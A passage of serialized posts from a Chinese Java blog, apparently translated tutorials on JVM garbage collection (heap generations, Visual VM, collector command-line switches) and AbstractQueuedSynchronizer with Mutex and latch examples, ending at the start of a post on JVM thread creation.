ms]最终确定要收集的区域集所花费的时间。通常非常小；必须选择旧时稍长。 Ref Proc123[Ref Proc: 4.4 ms]处理从 GC 的先前阶段推迟的软、弱等引用所花费的时间。 Ref Enq123[Ref Enq: 0.1 ms]将软、弱等引用放入待处理列表所花费的时间。 Free CSet123[Free CSet: 2.0 ms]释放刚刚收集的区域集（包括它们的记忆集）所花费的时间。 总结在本 OBE 中，您将了解 Java JVM 中包含的 G1 垃圾收集器的概述。首先，您了解了堆和垃圾收集器如何成为任何 Java JVM 的关键部分。接下来你回顾了垃圾收集是如何使用 CMS 收集器和 G1 收集器工作的。接下来，您了解了 G1 命令行开关以及使用它们的最佳实践。最后，您了解了 GC 日志中包含的日志记录对象和数据。 在本教程中，您学习了： Java JVM 的组件 G1 收集器概述 CMS 收集器的回顾 G1 收集器的查看 命令行开关和最佳实践 使用 G1 日志","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"gc","slug":"gc","permalink":"https://xxzkid.github.io/tags/gc/"}]},{"title":"Java垃圾收集基础","slug":"java-gc01","date":"2022-07-22T00:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2022/java-gc01/","link":"","permalink":"https://xxzkid.github.io/2022/java-gc01/","excerpt":"概览目的本教程介绍垃圾收集如何与 Hotspot JVM 配合使用的基础知识。了解垃圾收集器的功能后，了解如何使用 Visual VM 监控垃圾收集过程。最后，了解 Java SE 7 Hotspot JVM 中可用的垃圾收集器。","text":"概览目的本教程介绍垃圾收集如何与 Hotspot JVM 配合使用的基础知识。了解垃圾收集器的功能后，了解如何使用 Visual VM 监控垃圾收集过程。最后，了解 Java SE 7 Hotspot JVM 中可用的垃圾收集器。 简介本 OBE 涵盖了 Java 中的 Java 虚拟机 (JVM) 垃圾收集 (GC) 的基础知识。在 OBE 的第一部分中，提供了 JVM 的概述以及垃圾收集和性能的介绍。接下来的学生将获得关于垃圾收集如何在 JVM 中工作的分步指南。接下来为学习者提供了一个动手活动，以试用 Java JDK 中提供的一些监控工具，并将他们刚刚学到的关于垃圾收集的知识付诸实践。最后，提供了一节介绍 Hotspot JVM 中可用的垃圾收集方案选项。 前提条件 JDK7 jdk7 Java技术与JVMJava概览Java 是 Sun Microsystems 于 1995 年首次发布的一种编程语言和计算平台。它是支持 Java 程序（包括实用程序、游戏和业务应用程序）的底层技术。 Java 在全球超过 8.5 亿台个人计算机和全球数十亿台设备上运行，包括移动设备和电视设备。 Java 由许多关键组件组成，它们作为一个整体创建了 Java 平台 JRE (Java Runtime Edition)下载 Java 时，您将获得 Java 运行时环境 (JRE)。 JRE 由 Java 虚拟机 (JVM)、Java 平台核心类和支持 Java 平台库组成。这三个都是在您的计算机上运行 Java 应用程序所必需的。在 Java 7 中，Java 应用程序作为操作系统中的桌面应用程序运行，作为桌面应用程序运行，但使用 Java Web Start 从 Web 安装，或者作为浏览器中的 Web 嵌入式应用程序（使用 JavaFX）运行。 Java编程语言 (Java Programming Language)Java 是一种面向对象的编程语言，包括以下特性。 平台独立性——Java 应用程序被编译成字节码，存储在class文件中并加载到 JVM 中。由于应用程序在 JVM 中运行，因此它们可以在许多不同的操作系统和设备上运行。 面向对象——Java 是一种面向对象的语言，它采用了 C 和 C++ 的许多特性并对其进行了改进。 自动垃圾收集 - Java 自动分配和释放内存，因此程序不会承担该任务。 丰富的标准库 - Java 包含大量可用于执行诸如输入/输出、网络和日期操作等任务的预制对象。 JDK (Java Development Kit)Java Development Kit (JDK) 是一组用于开发 Java 应用程序的工具。使用 JDK，您可以编译用 Java 编程语言编写的程序并在 JVM 中运行它们。此外，JDK 提供了用于打包和分发应用程序的工具。 JDK 和 JRE 共享 Java 应用程序编程接口 (Java API)。 Java API 是开发人员用来创建 Java 应用程序的预打包库的集合。 Java API 通过提供工具来完成许多常见的编程任务，包括字符串操作、日期/时间处理、网络和实现数据结构（例如，列表、映射、堆栈和队列），从而使开发更容易。 JAVA虚拟机(Java Virtual Machine)Java 虚拟机 (JVM) 是一种抽象计算机。 JVM 是一个程序，对于编写在其中执行的程序来说，它看起来就像一台机器。通过这种方式，Java 程序被写入同一组接口和库。特定操作系统的每个 JVM 实现都将 Java 编程指令转换为在本地操作系统上运行的指令和命令。这样，Java 程序就实现了平台独立性。 Java 虚拟机的第一个原型实现由 Sun Microsystems, Inc. 完成，它在类似于当代个人数字助理 (PDA) 的手持设备托管的软件中模拟 Java 虚拟机指令集。 Oracle 当前的实现在移动、桌面和服务器设备上模拟 Java 虚拟机，但 Java 虚拟机不采用任何特定的实现技术、主机硬件或主机操作系统。它本身不是解释的，但也可以通过将其指令集编译为硅 CPU 的指令集来实现。它也可以用微码或直接用硅实现。 Java 虚拟机对 Java 编程语言一无所知，只知道一种特定的二进制格式，即class文件格式。class文件包含 Java 虚拟机指令（或字节码）和符号表，以及其他辅助信息。 为了安全起见，Java 虚拟机对类文件中的代码施加了强大的句法和结构约束。但是，任何具有可以用有效类文件表示的功能的语言都可以由 Java 虚拟机托管。被一个普遍可用的、独立于机器的平台所吸引，其他语言的实现者可以将 Java 虚拟机作为他们语言的交付工具。 探索JVM架构Hotspot 架构HotSpot JVM 的架构支持强大的特性和能力基础，并支持实现高性能和大规模可扩展性的能力。例如，HotSpot JVM JIT 编译器生成动态优化。换句话说，它们在 Java 应用程序运行时做出优化决策，并生成针对底层系统架构的高性能本机机器指令。此外，通过其运行时环境和多线程垃圾收集器的成熟演变和持续工程，HotSpot JVM 即使在最大的可用计算机系统上也能产生高可扩展性。JVM 的主要组件包括类加载器、运行时数据区和执行引擎。 关键Hotspot组件下图中突出显示了与性能相关的 JVM 关键组件。 JVM 的三个组件在调优性能时需要重点关注。堆是存储对象数据的地方。然后，该区域由启动时选择的垃圾收集器管理。大多数调整选项都与堆大小和为您的情况选择最合适的垃圾收集器有关。 JIT 编译器对性能也有很大影响，但很少需要使用较新版本的 JVM 进行调整。 性能基础通常，在调整 Java 应用程序时，重点是两个主要目标之一：响应性或吞吐量。随着教程的进行，我们将参考这些概念。 响应能力 (Responsiveness)响应性是指应用程序或系统响应请求的数据的速度。示例包括： 桌面 UI 响应事件的速度 网站返回页面的速度 返回数据库查询的速度 对于专注于响应能力的应用程序，大的暂停时间是不可接受的。重点是在短时间内做出反应 吞吐量 (Throughput)吞吐量侧重于在特定时间段内最大化应用程序的工作量。如何衡量吞吐量的示例包括： 在给定时间内完成的事务数。 批处理程序在一小时内可以完成的作业数。 一个小时内可以完成的数据库查询数。 对于专注于吞吐量的应用程序来说，较长的暂停时间是可以接受的。由于高吞吐量应用程序在较长时间内专注于基准测试，因此无需考虑快速响应时间。 描述垃圾收集什么是自动垃圾收集？自动垃圾回收是查看堆内存，识别哪些对象正在使用，哪些没有，并删除未使用的对象的过程。使用中的对象或引用的对象意味着程序的某些部分仍然维护指向该对象的指针。程序的任何部分都不再引用未使用的对象或未引用的对象。因此可以回收未引用对象使用的内存。 在像 C 这样的编程语言中，分配和释放内存是一个手动过程。在 Java 中，释放内存的过程由垃圾收集器自动处理。基本过程可以描述如下。 第 1 步：标记该过程的第一步称为标记。这是垃圾收集器识别哪些内存正在使用，哪些没有使用的地方。 引用的对象以蓝色显示。未引用的对象以金色显示。在标记阶段扫描所有对象以做出此决定。如果必须扫描系统中的所有对象，这可能是一个非常耗时的过程。 第 2 步：正常删除正常删除删除未引用的对象，留下引用的对象和指向可用空间的指针。 内存分配器保存对可以分配新对象的可用空间块的引用。 步骤 2a：使用压缩删除为了进一步提高性能，除了删除未引用的对象外，还可以压缩剩余的引用对象。通过将引用的对象一起移动，这使得新的内存分配更加容易和快捷。 为什么要进行分代垃圾收集？如前所述，必须标记和压缩 JVM 中的所有对象是低效的。随着越来越多的对象被分配，对象列表越来越多，导致垃圾收集时间越来越长。然而，应用的经验分析表明，大多数对象都是短暂的。 这是此类数据的示例。 Y 轴显示分配的字节数，X 访问显示随时间分配的字节数。 如您所见，随着时间的推移，分配的对象越来越少。事实上，大多数对象的寿命都很短，如图左侧的较高值所示。 JVM堆分代从对象分配行为中学到的信息可以用来增强 JVM 的性能。因此，堆被分解成更小的部分或代。堆部分是：年轻代(Young Generation), 老年代(Old or Tenured Generation), 和永久代(Permanent Generation) 年轻代是所有新对象被分配和老化的地方。当年轻代填满时，这会导致Minor GC。假设对象死亡率很高，可以优化次要集合。一个充满死亡对象的年轻代很快就会被收集起来。一些幸存的对象被老化并最终移动到老年代。 Stop the World Event——所有Minor GC都是“STW”事件。这意味着所有应用程序线程都将停止，直到操作完成。Minor GC始终是 STW 事件。 老年代用于存储长期存活的对象。通常，为年轻代对象设置一个阈值，当满足该年龄时，该对象将移动到老年代。最终需要收集老年代。此事件称为Major GC。 Major GC也是 STW 事件。通常一个Major GC要慢得多，因为它涉及所有活动对象。因此，对于响应式应用程序，应尽量减少Major GC。另请注意，Major GC的 STW 事件的长度受用于老年代空间的垃圾收集器类型的影响。 永久代包含 JVM 所需的元数据，用于描述应用程序中使用的类和方法。 JVM 在运行时根据应用程序使用的类填充永久代。此外，Java SE 库类和方法可能存储在这里。 如果 JVM 发现不再需要这些类并且其他类可能需要空间，则这些类可能会被收集（卸载）。永久代包含在完整的垃圾收集中。 分代垃圾收集过程现在您了解了为什么堆被分成不同的代，是时候看看这些空间究竟是如何相互作用的了。下面的图片介绍了 JVM 中的对象分配和老化过程。 首先，任何新对象都被分配到伊甸园空间。两个幸存者空间一开始都是空的。 当Eden空间填满时，会触发minor GC。 被引用的对象被移动到第一个Survivor空间。当Eden空间被清除时，未引用的对象将被删除。 在下一次minor GC 中，同样的事情发生在Eden空间。未引用的对象被删除，被引用的对象被移动到survivor空间。然而，在这种情况下，它们被移动到第二个Survivor空间（S1）。此外，来自第一个survivor空间 (S0) 上的最后一次minor GC 的对象的年龄增加并被移动到 S1。一旦所有幸存的对象都被移动到 S1，S0 和 eden 都将被清除。请注意，我们现在在survivor空间中有不同年龄的对象。 5.在下一次minor GC 中，重复相同的过程。然而，这一次survivor空间切换。被引用的对象被移动到 S0。幸存的物体会老化。 Eden 和 S1 被清除。 在一次 minor GC 之后，当老化对象达到某个年龄阈值（本例中为 8）时，它们会从年轻代提升到老年代。 随着 Minor GC 的不断发生，对象将继续被提升到老年代空间。 所以这几乎涵盖了年轻一代的整个过程。最终，将在老年代执行一次major GC，清理并压缩该空间。 进行自己的观察概览您已经使用一系列图片看到了垃圾收集过程。现在是时候现场体验和探索这个过程了。在本活动中，您将运行 Java 应用程序并使用 Visual VM 分析垃圾收集过程。 Visual VM 程序包含在 JDK 中，允许开发人员监控正在运行的 JVM 的各个方面。 动手活动第 1 步：初始设置下载demo 第 2 步：启动演示应用程序安装 Java JDK 和演示后，您现在可以运行将在本活动中分析的演示应用程序。对于此示例，演示安装在 c:\\javademos 中。 演示应用程序是一个 2D 图形演示。要执行它，请键入：java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseSerialGC -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar 第 3 步：启动 VisualVM要启动 Visual VM，请使用 C:\\Program Files\\Java\\jdk1.7.0_XX\\bin 目录中的 jvisualvm 可执行文件。我建议您将此目录添加到您的路径中。在 Windows 7 上，步骤如下：Start -&gt; Computer -&gt; System Properties -&gt; Advanced System Settings -&gt; Environment Variables.然后在系统变量下选择路径并添加 C:\\Program Files\\Java\\jdk1.7.0_XX\\bin;到路径（其中 XX 是 JDK 的当前版本）。单击确定几次，然后关闭对话框。 完成此操作后，您应该能够打开命令提示符窗口并键入 jvisualvm。 Visual VM 第一次运行时，它会对您的系统进行校准。您将看到如下消息： 然后是这样的消息： 最后加载主用户界面。 从这里，我们可以监控正在运行的 JVM。但是，对于这个活动，我们需要添加 VisualGC 插件。 第 4 步：安装 Visual GCVisual VM 的 Visual GC 插件提供了 JVM 中垃圾收集器活动的图形表示。它是免费的，可以按照以下步骤添加到您的安装中。 要安装 Visual GC，请从菜单中选择Tools —&gt; Plugins。您应该得到以下对话框。2.选择 Visual GC，然后选择安装按钮。3.插件安装程序启动。点击下一步。 阅读并接受许可协议。单击安装。现在将安装插件。5.该插件现已安装。单击完成以完成安装。6.单击关闭按钮关闭插件对话框。安装了 VisualGC。现在我们可以检查 Java2Demo 以了解正在发生的事情。 第 5 步：分析 Java2Demo是时候分析我们在第 2 步中启动的应用程序了。 首先，在 Applications 选项卡的 Local applications 列表中右键单击 Java2Demo 应用程序。选择打开。 应用程序被加载到 Visual VM 中。请注意，界面右侧加载了许多选项卡。单击可视 GC 选项卡。3.Visual GC 选项卡显示垃圾收集器中正在进行的所有活动。您可以看到 Eden 空间被填满，数据在两个survivor空间 S1 和 S0 之间移动。此外，右侧显示了与垃圾收集器相关的图表和统计信息。随意尝试其他选项卡并查看有关 JVM 的信息。此外，您可以尝试更改示例应用程序中显示的字符串或图像的数量，以了解这对垃圾收集过程有何影响。 Java 垃圾收集器您现在了解了垃圾收集的基础知识，并且已经观察了垃圾收集器在示例应用程序中的作用。在本节中，您将了解可用于 Java 的垃圾收集器以及选择它们所需的命令行开关。 常见的堆相关开关Java 可以使用许多不同的命令行开关。本节介绍了本 OBE 中也使用的一些更常用的开关。| 开关 | 描述 || — | — || -Xms | 设置 JVM 启动时的初始堆大小。 || -Xmx | 设置最大堆大小。 || -Xmn | 设置年轻代的大小。 || -XX:PermSize | 设置永久代的起始大小。 || -XX:MaxPermSize | 设置永久代的最大大小。 | 串行收集器(Serial GC)串行收集器是 Java SE 5 和 6 中客户端样式机器的默认设置。使用串行收集器，次要和主要垃圾收集都是串行完成的（使用单个虚拟 CPU）。此外，它使用了一种标记紧凑的收集方法。此方法将较旧的内存移动到堆的开头，以便在堆的末尾将新的内存分配变成一个连续的内存块。这种内存压缩可以更快地将新的内存块分配给堆。 使用案例对于大多数对暂停时间要求不高且在客户端式机器上运行的应用程序来说，串行 GC 是首选的垃圾收集器。它仅利用单个虚拟处理器进行垃圾收集工作（因此，它的名字）。尽管如此，在今天的硬件上，串行 GC 可以有效地管理大量具有几百 MB Java 堆的重要应用程序，并且在最坏情况下的暂停时间相对较短（完全垃圾收集大约需要几秒钟）。 Serial GC 的另一个流行用途是在同一台机器上运行大量 JVM 的环境中（在某些情况下，JVM 比可用处理器多！）。在这样的环境中，当 JVM 进行垃圾收集时，最好只使用一个处理器来最大限度地减少对剩余 JVM 的干扰，即使垃圾收集可能会持续更长时间。串行 GC 非常适合这种权衡。 最后，随着具有最小内存和少数内核的嵌入式硬件的普及，串行 GC 可能会卷土重来。 命令行开关要启用串行收集器，请使用：-XX:+UseSerialGC下面是启动 Java2Demo 的示例命令行：java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseSerialGC -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar 并行垃圾收集器(Parallel GC)并行垃圾收集器使用多个线程来执行年轻代垃圾收集。默认情况下，在具有 N 个 CPU 的主机上，并行垃圾收集器在收集中使用 N 个垃圾收集器线程。垃圾收集器线程的数量可以通过命令行选项控制： -XX:ParallelGCThreads=&lt;所需数量&gt; 在具有单个 CPU 的主机上，即使已请求并行垃圾收集器，也会使用默认垃圾收集器。在具有两个 CPU 的主机上，并行垃圾收集器的性能通常与默认垃圾收集器一样好，并且可以预期在具有两个以上 CPU 的主机上减少年轻代垃圾收集器的暂停时间。 Parallel GC 有两种风格。 使用案例并行收集器也称为吞吐量收集器。因为它可以使用多个 CPU 来加快应用程序的吞吐量。当需要完成大量工作并且可以接受长时间的停顿时，应该使用此收集器。例如，打印报告或账单或执行大量数据库查询等批处理。 -XX:+UseParallelGC使用此命令行选项，您将获得一个多线程年轻代收集器和一个单线程老年代收集器。该选项还对老年代进行单线程压缩。 下面是启动 Java2Demo 的示例命令行：java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseParallelGC -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar -XX:+UseParallelOldGC使用 -XX:+UseParallelOldGC 选项，GC 既是多线程年轻代收集器，也是多线程老年代收集器。它也是一个多线程压缩收集器。 HotSpot 只在老年代进行压缩。 HotSpot 中的年轻代被认为是一个副本收集器；因此，不需要压缩。 压缩描述了以对象之间没有孔的方式移动对象的行为。垃圾收集扫描后，活动对象之间可能会留下空洞。压实移动对象，以便没有剩余的孔。垃圾收集器可能是非压缩收集器。因此，并行收集器和并行压缩收集器之间的区别可能是后者在垃圾收集扫描后压缩空间。前者不会。 下面是启动 Java2Demo 的示例命令行：java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseParallelOldGC -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar 并发标记扫描收集器 (CMS)Concurrent Mark Sweep (CMS) 收集器（也称为并发低暂停收集器）收集老年代。它试图通过与应用程序线程同时进行大部分垃圾收集工作来最小化由于垃圾收集而导致的暂停。通常并发低暂停收集器不会复制或压缩活动对象。垃圾收集是在不移动活动对象的情况下完成的。如果碎片成为问题，请分配更大的堆。 注意：年轻代的 CMS 收集器使用与并行收集器相同的算法。 使用案例CMS 收集器应该用于需要低暂停时间并且可以与垃圾收集器共享资源的应用程序。示例包括响应事件的桌面 UI 应用程序、响应请求的 Web 服务器或响应查询的数据库。 命令行开关要启用 CMS 收集器，请使用：-XX:+UseConcMarkSweepGC并设置线程数使用：-XX:ParallelCMSThreads=&lt;n&gt; 下面是启动 Java2Demo 的示例命令行：java -Xmx12m -Xms3m -Xmn1m -XX:PermSize=20m -XX:MaxPermSize=20m -XX:+UseConcMarkSweepGC -XX:ParallelCMSThreads=2 -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar G1 垃圾收集器Garbage First 或 G1 垃圾收集器在 Java 7 中可用，旨在长期替代 CMS 收集器。 G1 收集器是一个并行、并发和增量压缩的低暂停垃圾收集器，它的布局与前面描述的其他垃圾收集器完全不同。但是，详细讨论超出了本 OBE 的范围。 命令行开关要启用 G1 收集器，请使用：-XX:+UseG1GC 下面是启动 Java2Demo 的示例命令行：java -Xmx12m -Xms3m -XX:+UseG1GC -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar 总结在本 OBE 中，您将了解 Java JVM 上的垃圾收集系统。首先，您了解了堆和垃圾收集器如何成为任何 Java JVM 的关键部分。自动垃圾收集是使用分代垃圾收集方法完成的。一旦你了解了这个过程，你就可以使用 Visual VM 工具观察它。最后，您查看了 Java Hospot JVM 中可用的垃圾收集器。 在本教程中，您学习了： Java JVM 的组件 自动垃圾收集的工作原理 分代垃圾收集过程 如何使用 Visual VM 监控 JVM JVM 上可用的垃圾收集器类型","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"gc","slug":"gc","permalink":"https://xxzkid.github.io/tags/gc/"}]},{"title":"AbstractQueuedSynchronizer详解","slug":"aqs-01","date":"2020-06-10T08:00:00.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2020/aqs-01/","link":"","permalink":"https://xxzkid.github.io/2020/aqs-01/","excerpt":"AbstractQueuedSynchronizer提供一个框架，用于实现依赖于先进先出（FIFO）等待队列的阻塞锁和相关的同步器（semaphores(信号量)，events(事件)等）。","text":"AbstractQueuedSynchronizer提供一个框架，用于实现依赖于先进先出（FIFO）等待队列的阻塞锁和相关的同步器（semaphores(信号量)，events(事件)等）。 这个类旨在为大多数依赖单个原子int值表示state的同步器提供有用的基础。子类必须定义更改此state的protected方法，并定义该state对于获取或释放此对象而言意味着什么。鉴于这些，此类中的其他方法将执行所有排队和阻塞机制。子类可以维护其他状态字段，但仅跟踪使用getState，setState，compareAndSetState方法进行原子更新的int值的同步性。 子类应该定义为用于实现其封闭类的同步属性的非public内部帮助器类。类AbstractQueuedSynchronizer没有实现任何同步接口。相反，它定义了acquireInterruptible之类的方法，可以通过具体的锁和相关的同步器适当地调用这些方法来实现其public方法。 此类支持默认exclusive（互斥）模式和shared（共享）模式之一或两者。当以exclusive方式进行获取时，其他线程尝试进行的获取将无法成功。由多个线程获取的shared模式可能（但不一定）成功。该类不理解这些差异，只是从机械意义上说，当成功获取shared模式时，下一个等待线程（如果存在）也必须确定它是否也可以获取。在不同模式下等待的线程共享相同的FIFO队列。通常，实现子类仅支持这些模式之一，但在ReadWriteLock中两者（exclusive和shared）都发挥了作用。仅支持exclusive模式或仅支持shared模式的子类无需定义支持未使用模式的方法。 此类定义了一个嵌套的ConditionObject类，该类可以被支持exclusive模式的子类用作Condition实现，为此方法isHeldExclusively报告是否针对当前线程专有地保持同步，使用getState当前值调用的方法release会完全释放此对象，并且给定已保存的状态值，acquire最终会将此对象恢复为先前的获取状态。否则，没有AbstractQueuedSynchronizer方法会创建这样的条件，因此，如果无法满足此约束，请不要使用它。 ConditionObject的行为当然取决于其同步器实现的语义。 此类提供了内部队列的检查，检测和监视方法，以及条件对象的类似方法。可以根据需要使用AbstractQueuedSynchronizer将它们导出到类中以实现其同步机制。 此类的序列化仅存储基础原子整数维护状态，因此反序列化的对象具有空线程队列。需要可序列化的典型子类将定义一个readObject方法，该方法可在反序列化时将其恢复为已知的初始状态。 用法 要将此类用作同步器的基础，请使用getState，setState，compareAndSetState重新定义以下方法： tryAcquire tryRelease tryAcquireShared tryReleaseShared isHeldExclusively 默认情况下，这些方法中的每一个都会引发UnsupportedOperationException。这些方法的实现必须在内部是线程安全的，并且通常应简短且不阻塞。定义这些方法是仅仅支持的使用此类的方法。所有其他方法都声明为final，因为它们不能独立变化。 您可能还会发现从AbstractOwnableSynchronizer继承的方法对于跟踪拥有独占同步器的线程很有用。鼓励您使用它们-这使监视和诊断工具可以帮助用户确定哪些线程持有锁。 即使此类基于内部FIFO队列，它也不会自动执行FIFO获取策略。exclusive同步的核心采取以下形式： Acquire: 1234while (!tryAcquire(arg)) &#123; // 排队线程（如果尚未排队） // 可能阻止当前线程&#125; Release: 1234if (tryRelease(arg)) &#123; // 释放阻止第一个排队的线程 // 共享模式相似，但可能涉及级联信号。&#125; 因为获取队列中的获取检查是在排队之前被调用的，所以新获取线程可能会在被阻塞和排队的其他线程之前插入。但是，如果需要，您可以定义tryAcquire和/或tryAcquireShared以通过内部调用一种或多种检查方法来禁用插入，从而提供一个fair(公平) FIFO获取顺序。特别是，如果hasQueuedPredecessors（一种专门为公平同步器设计的方法）返回true，则大多数公平同步器都可以定义tryAcquire以返回false。其他变化也是可能的。 吞吐量和可扩展性通常是默认插入（也称为greedy(贪心) ，renouncement(放弃)和convoy-avoidance(避免车队)）策略。尽管不能保证这是公平的，也可以避免饥饿，但允许在较早排队的线程在较晚排队的线程之前进行重新竞争，并且每个重新争用都可以毫无偏向地成功抵御传入线程。同样，尽管获取不是通常意义上的旋转，但它们可能会在阻塞之前执行tryAcquire的多次调用，并插入其他计算。当仅短暂地保持排他同步时，这将提供旋转的大部分好处，而在不进行排他同步时，则不会带来很多负担。如果需要的话，您可以通过在调用之前对获取方法进行“快速路径”检查来增强此功能，可能会预先检查hasContended和/或hasQueuedThreads以仅在同步器可能不这样做的情况下这样做争辩。 此类为同步提供了有效且可扩展的基础，部分原因是通过将其使用范围专门用于可以依靠int状态，获取和释放参数以及内部FIFO等待队列的同步器。如果不足够，则可以使用java.util.concurrent.atomic atomic类，您自己的自定义java.util.Queue类和LockSupport阻止从较低级别构建同步器支持。 使用范例 这是一个不可重入的互斥锁定类，使用值0表示解锁状态，使用值1表示锁定状态。 尽管不可重入锁并不严格要求记录当前所有者线程，但是无论如何，此类都这样做以使使用情况更易于监视。 它还支持条件并公开一种检测方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Mutex implements Lock, java.io.Serializable &#123; // 我们内部的帮助类 private static class Sync extends AbstractQueuedSynchronizer &#123; // 报告是否处于锁定状态 protected boolean isHeldExclusively() &#123; return getState() == 1; &#125; // 如果状态为零，则获取锁 public boolean tryAcquire(int acquires) &#123; assert acquires == 1; // 否则未使用 if (compareAndSetState(0, 1)) &#123; setExclusiveOwnerThread(Thread.currentThread()); return true; &#125; return false; &#125; //通过将状态设置为零来释放锁定 protected boolean tryRelease(int releases) &#123; assert releases == 1; // 否则未使用 if (getState() == 0) throw new IllegalMonitorStateException(); setExclusiveOwnerThread(null); setState(0); return true; &#125; // 提供条件 Condition newCondition() &#123; return new ConditionObject(); &#125; // 正确反序列化 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123; s.defaultReadObject(); setState(0); // 重置到未锁定状态 &#125; &#125; // The sync object does all the hard work. We just forward to it. private final Sync sync = new Sync(); public void lock() &#123; sync.acquire(1); &#125; public boolean tryLock() &#123; return sync.tryAcquire(1); &#125; public void unlock() &#123; sync.release(1); &#125; public Condition newCondition() &#123; return sync.newCondition(); &#125; public boolean isLocked() &#123; return sync.isHeldExclusively(); &#125; public boolean hasQueuedThreads() &#123; return sync.hasQueuedThreads(); &#125; public void lockInterruptibly() throws InterruptedException &#123; sync.acquireInterruptibly(1); &#125; public boolean tryLock(long timeout, TimeUnit unit) throws InterruptedException &#123; return sync.tryAcquireNanos(1, unit.toNanos(timeout)); &#125;&#125; 这是一个类似于java.util.concurrent.CountDownLatch的闩锁类，只不过它只需要触发一个signal即可。 由于闩锁是非排他性的，因此它使用shared获取和释放方法。 123456789101112131415161718192021class BooleanLatch &#123; private static class Sync extends AbstractQueuedSynchronizer &#123; boolean isSignalled() &#123; return getState() != 0; &#125; protected int tryAcquireShared(int ignore) &#123; return isSignalled() ? 1 : -1; &#125; protected boolean tryReleaseShared(int ignore) &#123; setState(1); return true; &#125; &#125; private final Sync sync = new Sync(); public boolean isSignalled() &#123; return sync.isSignalled(); &#125; public void signal() &#123; sync.releaseShared(1); &#125; public void await() throws InterruptedException &#123; sync.acquireSharedInterruptibly(1); &#125;&#125; AbstractQueuedSynchronizer.Node 等待队列节点类。 等待队列是“ CLH”（Craig，Landin和Hagersten）锁定队列的变体。 CLH锁通常用于自旋锁。相反，我们将它们用于阻塞同步器，但是使用相同的基本策略，将有关线程的某些控制信息保存在其节点的前身中。每个节点中的“状态”字段将跟踪线程是否应阻塞。节点的前任释放时会发出信号。否则，队列的每个节点都充当一个特定通知样式的监视器，其中包含一个等待线程。虽然状态字段不控制是否授予线程锁等。线程可能会尝试获取它是否在队列中的第一位。但是先行并不能保证成功。它只赋予了抗辩的权利。因此，当前发布的竞争者线程可能需要重新等待。 要加入CLH锁，您可以自动将其作为新尾部拼接。要出队，您只需设置头字段。 123 +------+ prev +-----+ +-----+head | | &lt;---- | | &lt;---- | | tail +------+ +-----+ +-----+ 插入到CLH队列中只需要对“尾巴”执行一次原子操作，因此存在一个简单的原子分界点，即从未排队到排队。同样，出队仅涉及更新“头”。但是，节点需要花费更多的精力来确定其后继者是谁，部分原因是要处理由于超时和中断而可能导致的取消。 “ prev”链接（在原始CLH锁中不使用）主要用于处理取消。如果取消某个节点，则其后继节点（通常）会重新链接到未取消的前任节点。有关自旋锁情况下类似机制的说明，请参见Scott和Scherer的论文，网址为http://www.cs.rochester.edu/u/scott/synchronization/ 我们还使用“next”链接来实现阻止机制。每个节点的线程ID保留在其自己的节点中，因此前任通过遍历下一个链接以确定它是哪个线程，从而通知下一个节点唤醒。确定后继者必须避免与新排队的节点竞争以设置其前任节点的“ next”字段。如果需要，可以通过在节点的后继者为空时从原子更新的“tail”向后检查来解决此问题。 （或者换句话说，next链接是一种优化，因此我们通常不需要向后扫描。） 取消将一些保守性引入到基本算法中。由于我们必须轮询其他节点的取消，因此我们可能会遗漏没有注意到已取消的节点在我们前面还是后面。要解决此问题，必须始终在取消时取消后继者，使他们能够稳定在新的前任者身上，除非我们能确定一个未取消的前任者将承担这一责任。 CLH队列需要一个虚拟标头节点才能开始。但是，我们不会在构建过程中创建它们，因为如果没有争执，那将是浪费时间。取而代之的是，构造节点，并在第一次争用时设置头和尾指针。 等待条件的线程使用相同的节点，但使用附加链接。条件只需要在简单（非并行）链接队列中链接节点，因为仅当它们专用时才可以访问它们。等待时，将节点插入条件队列。收到信号后，该节点将转移到主队列。状态字段的特殊值用于标记节点所在的队列。 感谢Dave Dice，Mark Moir，Victor Luchangco，Bill Scherer和Michael Scott以及JSR-166专家组的成员，对此类的设计提出了有益的想法，讨论和批评。 未完待续…","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"synchronize","slug":"synchronize","permalink":"https://xxzkid.github.io/tags/synchronize/"}]},{"title":"JVM如何创建线程","slug":"jvm-create-thread","date":"2020-05-20T10:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2020/jvm-create-thread/","link":"","permalink":"https://xxzkid.github.io/2020/jvm-create-thread/","excerpt":"1234567Thread t = new Thread(new Runnable() &#123; @Override public void run() &#123; &#125;&#125;);t.start(); 上面这段代码在JVM中是如何实现的呢？","text":"1234567Thread t = new Thread(new Runnable() &#123; @Override public void run() &#123; &#125;&#125;);t.start(); 上面这段代码在JVM中是如何实现的呢？ 我们需要熟悉JNI 打开Thread.java 123456789publicclass Thread implements Runnable &#123; /* Make sure registerNatives is the first thing &lt;clinit&gt; does. */ private static native void registerNatives(); static &#123; registerNatives(); &#125; // ...&#125; 了解过JNI，那么我们知道Thread.java一定会对应一个c或c++文件，那么在JVM中Thread.java对应的C文件是openjdk-jdk8u-jdk8u\\jdk\\src\\share\\native\\java\\lang\\Thread.c 打开Thread.c，发现这个文件很简单 